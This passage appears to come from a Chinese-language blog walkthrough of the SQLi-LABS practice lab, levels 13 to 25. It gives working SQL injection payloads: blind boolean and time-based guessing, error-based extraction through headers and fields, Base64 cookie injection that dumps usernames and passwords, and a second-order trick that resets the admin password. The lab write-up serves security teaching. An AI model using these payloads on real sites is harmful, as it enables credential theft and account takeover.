class="string">&#x27;)and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;</span>b<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span>)<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;)and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;</span>u<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h2 id="Less-14-双注入双引号字符串"><a href="#Less-14-双注入双引号字符串" class="headerlink" title="Less-14 双注入双引号字符串"></a>Less-14 双注入双引号字符串</h2><ul><li>使用双引号后得到如下错误信息：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&quot;&quot;&quot; and password=&quot;&quot; LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>由于这里的和Less-13区别不大，根据题目提示将Less-13的单引号替换成双引号：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>&quot;and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;a&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>&quot;and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;d&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"></span><br><span class="line"># 查询第二位数据</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>&quot;and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;b&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>&quot;and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;u&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h2 id="Less-15-基于布尔值的字符串"><a href="#Less-15-基于布尔值的字符串" class="headerlink" title="Less-15 基于布尔值的字符串"></a>Less-15 基于布尔值的字符串</h2><ul><li>首先找出注入点。这里我们尝试在文本框中添加单引号。</li><li>返回失败的图片。我们再尝试在单引号后面加上<code>or1=1</code>然后发现返回成功的图片，我们就可以猜一下该SQL语句。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2 <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>使用下列方法</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;</span>a<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=&#x27;</span><span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;</span>d<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查询第二位数据</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=&#x27;</span><span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;</span>b<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=&#x27;</span><span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;</span>u<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h2 id="Less-16-基于盲时间的双引号字符串"><a href="#Less-16-基于盲时间的双引号字符串" class="headerlink" title="Less-16 基于盲时间的双引号字符串"></a>Less-16 基于盲时间的双引号字符串</h2><ul><li>根据题目提示我们可以假设该SQL语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2 <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> &quot;$username&quot; <span class="keyword">and</span> password <span class="operator">=</span> &quot;$password&quot;;</span><br></pre></td></tr></table></figure><ul><li>接下来尝试使用<code>&quot;or 1=if(1=1,sleep(3),0)--+</code>，进行注入发现没有延迟效果，应该是我们猜测的SQL语句有问题再次猜测：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2 <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span>(&quot;&quot;) <span class="keyword">and</span> password <span class="operator">=</span> (&quot;&quot;);</span><br></pre></td></tr></table></figure><ul><li>尝试使用<code>&quot;)or 1=if(1=1,sleep(3),0)--+</code>，发现注入成功。接下来尝试使用下列语句：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>&quot;)or+1=if(substr((select group_concat(username) from users),1,1)=&#x27;a&#x27;,sleep(3),0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;)<span class="keyword">or</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>&quot;)or+1=if(substr((select group_concat(username) from users),1,1)=&#x27;d&#x27;,sleep(3),0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"></span><br><span class="line"># 查询第二位数据</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;)<span class="keyword">or</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>&quot;)or+1=if(substr((select group_concat(username) from users),2,1)=&#x27;b&#x27;,sleep(3),0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;)<span class="keyword">or</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>&quot;)or+1=if(substr((select group_concat(username) from users),2,1)=&#x27;u&#x27;,sleep(3),0)--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h2 id="Less-17-更新查询基于错误字符串"><a href="#Less-17-更新查询基于错误字符串" class="headerlink" title="Less-17 更新查询基于错误字符串"></a>Less-17 更新查询基于错误字符串</h2><ul><li>假设该更新语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">table</span> <span class="keyword">set</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>根据上面猜测的语句无法进行注入。然后我就憋住去看了一下源代码。发现username进行过滤了，没办法注入然后我就打算在password中进行注入。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">123456</span><span class="string">&#x27;+where+1=exp(~(select+*+from+(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())a))--+&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><ul><li>这里我们利用报错注入来获取数据。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210928202630702.png" alt="image-20210928202630702"></p><h2 id="Less-18-标头注入基于错误字符串"><a href="#Less-18-标头注入基于错误字符串" class="headerlink" title="Less-18 标头注入基于错误字符串"></a>Less-18 标头注入基于错误字符串</h2><ul><li>首先我这里输入了正确的信息，页面会返回User-Agent。然后根据题目提示注入点在header头，返回根据页面的user-agent，可以推断出应该是在user-agent存在注入点。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210929095246337.png" alt="image-20210929095246337"></p><ul><li>在user-agent单引号以后出现错误。我们可以推断这是保存用户登录的SQL语句。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> (..., `<span class="keyword">user</span><span class="operator">-</span>agent`, `ip`, `username`) <span class="keyword">values</span> (..., <span class="string">&#x27;user-agent&#x27;</span>, <span class="string">&#x27;ip&#x27;</span>, <span class="string">&#x27;username&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>因为这里是使用插入语句我们应该使用报错注入。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bbb<span class="string">&#x27;,&#x27;</span><span class="number">123131</span><span class="string">&#x27;,exp(~(select * from (select group_concat(table_name) from information_schema.tables where table_schema=database())a)))-- &#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210929101511873.png" alt="image-20210929101511873"></p><h2 id="Less-19-标头注入Referer基于错误的字符串"><a href="#Less-19-标头注入Referer基于错误的字符串" class="headerlink" title="Less-19 标头注入Referer基于错误的字符串"></a>Less-19 标头注入Referer基于错误的字符串</h2><ul><li>根据题目提示，我们可以从Referer进行注入。尝试在Referer值设置为单引号，会出现下列错误。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210929102339731.png" alt="image-20210929102339731"></p><ul><li>根据错误提示，我们可以推断出该语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> (..., `referer`, `ip`) <span class="keyword">values</span> (..., <span class="string">&#x27;referer&#x27;</span>, <span class="string">&#x27;ip&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>使用下列语句进行注入：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span><span class="string">&#x27;,exp(~(select * from (select group_concat(table_name) from information_schema.tables where table_schema=database())a)))-- &#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210929103520548.png" alt="image-20210929103520548"></p><h2 id="Less-20-Cookie注入基于错误字符串"><a href="#Less-20-Cookie注入基于错误字符串" class="headerlink" title="Less-20 Cookie注入基于错误字符串"></a>Less-20 Cookie注入基于错误字符串</h2><ul><li>根据题目提示我们要先登录账号后才可以使用cookie来获取用户信息。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210929105835013.png" alt="image-20210929105835013"></p><ul><li>使用BurpSuite抓登录完成的包，然后修改Cookie中的值在后面加上单引号。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210929110115981.png" alt="image-20210929110115981"></p><ul><li>根据错误信息我们可以推断出该语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, ... <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> cookie <span class="operator">=</span> <span class="string">&#x27;$cookie&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>使用<code>Cookie: uname=&#39; or 1=1 --+</code>，发现注册成功然后使用<code>order by</code>关键字猜字段。</li><li>已经找到注入点了可以参考Less-1的解法。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210929111046256.png" alt="image-20210929111046256"></p><h2 id="Less-21-Cookie注入基于字符串错误-复杂"><a href="#Less-21-Cookie注入基于字符串错误-复杂" class="headerlink" title="Less-21 Cookie注入基于字符串错误-复杂"></a>Less-21 Cookie注入基于字符串错误-复杂</h2><ul><li>这里和Less-20一样需要登录。登录成功后我们可以在BurpSuite中查看请求的数据包。这里发现返回的Cookie给加密了，在BurpSuite可以查看到明文。</li></ul><p><img src="/../../images/SQLi-LABS/image-20211016203215779.png" alt="image-20211016203215779"></p><ul><li><p>可以在右侧看到这里使用了URL和Base64进行加密。接下来我们就使用<code>ctrl+r</code>快捷键打开Repeater&#96;功能。</p></li><li><p>然后我们将Cookie中的<code>uname</code>的值改为<code>YWRtaW4n</code>。然后发送会出现下面的错误。</p></li></ul><p><img src="/../../images/SQLi-LABS/image-20211016203858719.png" alt="image-20211016203858719"></p><ul><li>这里我们可以猜测该SQL语句可能为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, ... form <span class="keyword">table</span> <span class="keyword">where</span> cookie <span class="operator">=</span> (<span class="string">&#x27;$cookie&#x27;</span>) limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>现在我们就要开始构造payload进行攻击了。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nKSAtLSA<span class="operator">=</span></span><br><span class="line"># 上面内容不懂是什么可以看右侧。解密后的数据。</span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20211016205711586.png" alt="image-20211016205711586"></p><ul><li>接下来把Less-20的payload改一下就可以了。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JykgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUpIGZyb20gdXNlcnMpLChzZWxlY3QgZ3JvdXBfY29uY2F0KHBhc3N3b3JkKSBmcm9tIHVzZXJzKSAtLSA<span class="operator">=</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20211016210451296.png" alt="image-20211016210451296"></p><ul><li>注意这里最后不能使用<code>--+</code>而是使用<code>-- </code>如果不使用空格会无法进行注入。</li></ul><h2 id="Less-22-Cookie注入-基于字符串错误-双引号"><a href="#Less-22-Cookie注入-基于字符串错误-双引号" class="headerlink" title="Less-22 Cookie注入-基于字符串错误-双引号"></a>Less-22 Cookie注入-基于字符串错误-双引号</h2><ul><li>这题第一步和Less-20和Less-21一样。登录后的响应包和Less-21一样都进行加密处理，解密方式和Less-21一样。根据提示的提示这里我将Less-21的单引号替换成双引号。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4i</span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20211016212648244.png" alt="image-20211016212648244"></p><ul><li>根据错误信息我们可以尝试推断出该SQL语句。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, ... <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> cookie <span class="operator">=</span> &quot;$cookie&quot; limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>接下来开始构造payload进行注入。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCAxPTEgLS0g</span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20211016212116737.png" alt="image-20211016212116737"></p><ul><li>注入成功，接下来我们获取所有用户数据。这里我们可以从Less-21的payload修改一下。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IiB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSkgZnJvbSB1c2VycyksKHNlbGVjdCBncm91cF9jb25jYXQocGFzc3dvcmQpIGZyb20gdXNlcnMpIC0tIA<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20211016212518245.png" alt="image-20211016212518245"></p><h2 id="Less-23-基于错误-无评论"><a href="#Less-23-基于错误-无评论" class="headerlink" title="Less-23 基于错误-无评论"></a>Less-23 基于错误-无评论</h2><ul><li>打开页面提示我们需要传入id，这里我传入了id的值为1可以正常返回页面。尝试在1后面添加单引号就出现了错误。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure><ul><li>我们可以从错误信息推断出该SQL语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, ... form <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>经过测试发现以前的方法都无法使用，这时候我们就需要打开源代码查看。</li></ul><p><img src="/../../images/SQLi-LABS/image-20211025173349489.png" alt="image-20211025173349489"></p><ul><li>代码对我们的payload进行了处理。这里不能使用MySQL的注释。我们可以使用闭合SQL语句。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 正常返回数据</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+and+&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"># 返回空数据</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+and+&#x27;</span><span class="number">2</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>猜字段，因为不能使用<code>order by</code>关键字，我们就只能使用<code>union select null,...</code>语句来猜测数据。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 我们可以发现返回的数据中只有两个地方会进行变化，我们就可以先从两个<span class="keyword">null</span>开始。</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27;+union+select+null,null&#x27;</span> # The used <span class="keyword">SELECT</span> statements have a different number <span class="keyword">of</span> columns</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27;+union+select+null,null,null&#x27;</span> # 正确</span><br></pre></td></tr></table></figure><ul><li>接下来我们就需要获取所有数据。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27;union+select+1,(select+group_concat(username)+from+users),(select+group_concat(password)+from+users)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20211025194230601.png" alt="image-20211025194230601"></p><h2 id="Less-24-二级注射"><a href="#Less-24-二级注射" class="headerlink" title="Less-24 二级注射"></a>Less-24 二级注射</h2><ul><li>打开题目页面会返回一个登录表单，我们尝试使用<code>admin</code>账号进行登录，登录后会进入一个修改密码页面。</li><li>在登录页面测试以后发现有过滤规则，这时候我们就需要使用查看源代码。</li><li>在该题目目录下发现有下列文件：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@6220105599eb:/var/www/html/Less-24<span class="comment"># ls -l</span></span><br><span class="line">total 36</span><br><span class="line">-rwxr-xr-x 1 root root  242 Dec 16  2015 Logged-in.php</span><br><span class="line">-rwxr-xr-x 1 root root  530 Dec 16  2015 failed.php</span><br><span class="line">-rwxr-xr-x 1 root root  390 Dec 16  2015 forgot_password.php</span><br><span class="line">-rwxr-xr-x 1 root root 1678 Dec 16  2015 index.php</span><br><span class="line">-rwxr-xr-x 1 root root 1774 Dec 16  2015 logged-in.php</span><br><span class="line">-rwxr-xr-x 1 root root 1261 Dec 16  2015 login.php</span><br><span class="line">-rwxr-xr-x 1 root root 1955 Dec 16  2015 login_create.php</span><br><span class="line">-rwxr-xr-x 1 root root 1736 Dec 16  2015 new_user.php</span><br><span class="line">-rwxr-xr-x 1 root root 1571 Dec 16  2015 pass_change.php</span><br></pre></td></tr></table></figure><ul><li>查看所有文件以后该页面的流程如下：</li></ul><p><img src="/../../images/SQLi-LABS/less-24.png" alt="less-24"></p><ul><li>查看代码后发现<code>pass_change.php</code>文件<code>username</code>没有使用过滤函数，其他文件都有使用过滤函数。</li></ul><p><img src="/../../images/SQLi-LABS/image-20211025205559637.png" alt="image-20211025205559637"></p><ul><li>查看该题目的所有代码以后我发现我们没有办法获取所有数据，只可以修改信息。</li><li>我们可以尝试在这里进行注入，现在遇到一个问题我们要如何修改SESSION。<ul><li>这里我们可以通过创建新用户执行我们设置的SQL语句。</li><li>这里我们创建了一个用户名：<code>-- </code>的用户。</li><li>下一步我们就需要使用该用户进行登录，登录后我们就需要去修改该用户密码，因为这里的username没有使用过滤函数。</li><li>提交后会出现下列错误页面。</li></ul></li></ul><p><img src="/../../images/SQLi-LABS/image-20211025212159786.png" alt="image-20211025212159786"></p><ul><li>根据该错误页面我们可以断定我们注入成功。</li><li>接下来我们需要使用修改SESSON。<ul><li>首先创建一个payload的用户。如：<code>admin &#39; #&#39;</code>。这个payload是修改admin密码。</li><li>创建新用户以后我们进行修改密码。</li><li>修改成功以后我们就可以登录admin账号。</li></ul></li></ul><h2 id="Less-25-用OR-amp-AND欺骗"><a href="#Less-25-用OR-amp-AND欺骗" class="headerlink" title="Less-25 用OR&amp;AND欺骗"></a>Less-25 用OR&amp;AND欺骗</h2><ul><li><p>根据页面提示在链接添加一个属性和值：id&#x3D;1。正常返回数据。</p></li><li><p>判断该SQL语句的类型。</p><ul><li>使用在id值后面添加单引号。</li><li>出现错误信息，可以推断出该SQL语句为字符串类型。</li></ul></li><li><p>猜测该SQL语句。</p><ul><li>首先使用<code>order by</code>猜测该字段的数量，输入以后发生了错误。</li></ul><p><img src="/../../images/SQLi-LABS/image-20211025224319325.png" alt="image-20211025224319325"></p><ul><li><p>导致错误的原因是因为<code>order 